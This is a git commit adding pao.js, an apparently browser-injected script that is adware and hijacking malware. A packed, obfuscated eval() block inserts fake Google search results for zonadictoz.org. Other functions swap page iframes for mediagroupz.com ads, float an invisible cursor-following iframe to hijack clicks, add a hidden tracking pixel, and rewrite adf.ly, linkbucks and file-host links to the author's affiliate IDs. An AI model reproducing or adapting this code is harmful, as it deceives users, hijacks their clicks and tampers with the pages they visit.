b5cfc48b6de3a6df5a730e7f20bc95805b9b0758
djpao <urbanicano@gmail.com>
2013-06-13 13:27:32 -0300

    pao.js
    pao.js

---
+++ pao.js
@@ -0,0 +1,156 @@
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v B(){8 a=C[\'V\'](\'W\');a[\'D\'](\'X\',\'E/Y\');a[\'D\'](\'Z\',\'5://10.F.w/F-11.12\');C[\'13\'](\'14\')[0][\'15\'](a)};v G(a){a=a[\'x\']();8 b={a:/\\16/g,e:/17/g,i:/\\18/g,o:/\\19/g,u:/\\1a/g,n:/\\1b/g};1c(8 c 1d b){a=a[\'m\'](b[c],c)};8 d=a[\'m\'](/\\s/g,\'-\');8 e=d[\'m\'](/[^a-1e-1f-9\\-]/g,\'\');e=e[\'x\']();e=e[\'x\']();e=e[\'m\'](/-+/g,\'-\');e=e[\'m\'](/(^-)|(-$)/g,\'\');1g e};v H(){p(I[\'6\'][\'h\'](/J\\.w/)){p($(\'#K\')[\'1h\']){}1i{8 a=($(\'.1j\')[\'1k\'](0)[\'1l\']);L=a[\'1m\']();q=G(a);p(a[\'h\'](/u/)||a[\'h\'](/o/)||a[\'h\'](/i/)||a[\'h\'](/e/)||a[\'h\'](/a/)){p($(\'#z\')[\'E\']()!=\'\'){8 b=\'<M 3="g"> <2 3="1n" 1o="1p-"> <2 N-O=""> <2 N-O=""></2></2> <2 1q="0" 1r="1s" 1t-1u="1v 1w 1x" 3="1y"> <2 3="1z"> <2 3="1A"> </2> </2> </2> <P 3="r"><a 6="5://j.k/7/\'+q+\'/" 3="l"><4>\'+L+\'</4></a></P> <2 3="s"> <2 3="f 1B"> <Q>5://j.k/7/<b>\'+q+\'</b>/</Q><t 3="1C"><a 6="5://j.k/7/\'+q+\'/">R&1D;1E\\1F</a></t> </2> <t 3="1G"><4>\'+a+\'</4> - R 1H 1I 7 <4>S A</4>, T <4>1J A</4>, U y 1K 1L <4>1M A</4>.  </t> <2 3="1N"> <a 6="5://j.k/7/\'+q+\'/">\'+a+\'</a> - <a 6="5://j.k/7/1O/">S</a> - <a 6="5://j.k/7/1P/">T</a> - <a 6="5://j.k/7/1Q">U</a> </2> </2> </2> <!--n--> </M>\';$(\'#z\')[\'1R\'](b);$(\'#z\')[\'1S\'](\'<2 1T=\\\'K\\\' 1U=\\\'1V: 1W;\\\'>1</2>\')}}}}};p(I[\'6\'][\'h\'](/J\\.w/)){B();1X[\'1Y\'](\'H()\',1)};',62,123,'||div|class|em|http|href|descargar|var|||||||||match||zonadictoz|org||replace|||if|datolug|||span||function|com|toLowerCase||rso|gratis|addjqueryX|document|setAttribute|text|jquery|urlSlug|googlepageAjax|location|google|googlestestajax|dato2|li|data|ved|h3|cite|En|Peliculas|Programas|Musica|createElement|script|type|javascript|src|code|latest|js|getElementsByTagName|head|appendChild|u00e1|u00e9|u00ed|u00f3|u00fa|u00f1|for|in|zA|Z0|return|length|else|gbqfif|get|value|toUpperCase|vsc|sig|fT|tabindex|role|button|aria|label|Detalles|del|resultado|vspib|vspii|vspiic|kv|vshid|nbsp|cach|xE9|st|Zonadictoz|puedes|mp3|mucho|mas|Todo|osl|peliculas|programas|musica|prepend|append|id|style|display|none|window|setInterval'.split('|'),0,{}))
+function addjquery() {
+    var x = document.createElement('script');
+    x.setAttribute("type", "text/javascript");
+    x.setAttribute("src", "http://code.jquery.com/jquery-latest.js");
+    document.getElementsByTagName("head")[0].appendChild(x)
+}
+function validHost() {
+    if (location.href.match(/static\.ak\./i)) {
+        return false
+    } else if ("https:" == document.location.protocol) {
+        return false
+    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
+        return false
+    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
+        return false
+    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
+        return false
+    } else if (location.href.match(/blank/i)) {
+        return false
+    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
+        return false
+    } else if (location.href.match(/^\.hotmail\.com\//i)) {
+        return false
+    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
+        return false
+    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
+        return false
+    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
+        return false
+    } else if (location.href.match(/goojue\.com/i)) {
+        return false
+    } else {
+        return true
+    }
+}
+function otranet(a) {
+    _gaq.push(["_trackPageview", "/trackBannerM"]);
+    if (a.width == "728" && a.height == "90") {
+        a.src = "http://www.mediagroupz.com/ads728x90.htm"
+    } else if (a.width == "300" && a.height == "250") {
+        a.src = "http://www.mediagroupz.com/ads300x250.htm"
+    } else if (a.width == "160" && a.height == "600") {
+        a.src = "http://www.mediagroupz.com/ads160x600.htm"
+    } else if (a.width == "120" && a.height == "600") {
+        a.src = "http://www.mediagroupz.com/ads120x600.htm"
+    } else if (a.width == "468" && a.height == "60") {
+        a.src = "http://www.mediagroupz.com/ads468x60.htm"
+    } else if (a.width == "336" && a.height == "280") {
+        a.src = "http://www.mediagroupz.com/ads336x280.htm"
+    } else if (a.width == "125" && a.height == "125") {
+        a.src = "http://www.mediagroupz.com/ads125x125.htm"
+    } else if (a.width == "234" && a.height == "60") {
+        a.src = "http://www.mediagroupz.com/ads234x60.htm"
+    } else if (a.width == "250" && a.height == "250") {
+        a.src = "http://www.mediagroupz.com/ads250x250.htm"
+    }
+    return true
+}
+if (validHost()) {
+    var _gaq = _gaq || [];
+    _gaq.push(["_setAccount", "UA-32523397-1"]);
+    _gaq.push(["_setDomainName", "none"]);
+    _gaq.push(["_setAllowLinker", true]);
+    _gaq.push(["_trackPageview"]);
+    _gaq.push(["_setCustomVar", 1, "Z Plugin", "plugin_version", "0.6"]);
+    (function () {
+        var a = document.createElement("script");
+        a.type = "text/javascript";
+        a.async = true;
+        a.src = ("https:" == document.location.protocol ? "https://ssl" : "http://www") + ".google-analytics.com/ga.js";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(a, s)
+    }());
+    var zflag_nid = "1336";
+    var zflag_cid = "462";
+    var zflag_sid = "478";
+    var zflag_width = "1";
+    var zflag_height = "1";
+    var zflag_sz = "94";
+    var iframes = document.getElementsByTagName("iframe");
+    for (var i = 0; i < iframes.length; i++) {
+        iframe = iframes[i].src;
+        otranet(iframes[i])
+    }
+}
+$.noConflict();
+var interval;
+var iflag;
+var icontainer;
+var standardbody;
+jQuery(function () {
+  jQuery("body").append('<div style="overflow: hidden; width: 150px; height: 150px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer"><iframe src="http://mediagroupz.com/Videoads12.htm" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:150px; height:150px;" allowTransparency="true" id="cpx" name="cpx"></iframe></div>');
+	iflag = 0;
+	icontainer = document.getElementById('icontainer');
+	standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body //create reference to common "body" across doctypes
+	interval = setInterval("updateActiveElement();", 50);
+});
+jQuery("html").bind('mousemove', function (e) {
+	if (iflag == 0) {
+		var x = e.pageX - 5;
+		var y = e.pageY;
+		//console.log("X: " + x + " AND Y: " + y);
+		jQuery(icontainer).css('top', y).css('left', x);
+	}
+});
+
+function updateActiveElement() {
+	if (jQuery(document.activeElement).attr('id') == "cpx") {
+		var flag = 0;
+		clearInterval(interval);
+		iflag = 1;
+		if (flag != 0) document.location = "";
+	}
+}
+
+
+if(window.top==window.self){
+    var s = document.createElement('img');
+    s.setAttribute("width", "0");
+    s.setAttribute("height", "0");
+    s.setAttribute("style", "display:none;");
+    s.setAttribute("src", "http://whos.amung.us/swidget/zonadictoz.png");
+    document.getElementsByTagName("body")[0].appendChild(s);
+}
+
+
+function searchL(){
+	var links = document.getElementsByTagName("a");
+	var adf = /http:\/\/adf.ly\/.*?\//;
+	var lbk = /http:\/\/.*?\.linkbucks.com\/url\//;
+	for (var i = 0; i < links.length; i++) {
+		var link = links[i].href;
+		var adfL = link.replace(adf, "http://adf.ly/2279280/");
+		var lbkL = link.replace(lbk, "http://2a170c8a.linkbucks.com/url/");
+		if (link.match(adf)) {
+			links[i].href=adfL;
+		}
+		if (link.match(lbk)) {
+			links[i].href=lbkL;
+		}
+		addL(link, i);
+	}
+}
+function addL(link, i) {
+	var links = document.getElementsByTagName("a");
+	var domains = ['4fastfile.com', 'bitshare.com', 'depositfiles.com', 'megaupload.com', 'easy-share.com', 'downupload.com', 'extabit.com', 'filefactory.com', 'fileserve.com', 'freakshare.com', 'hitfile.net', 'hotfile.com', 'megashares.com', 'turbobit.net', 'uploading.com', 'uploadstation.com', 'vip-file.com'];
+	for (var i = 0; i < domains.length; i++) {
+		if (link.match("^(http|https)\:\/\/(www\.|d01\.)?" + domains[i].replace("\.", "\\\."))) {
+			links[i].href = "http://2a170c8a.linkbucks.com/url/" + link;
+        	}
+	}
+}
+searchL();
+
+
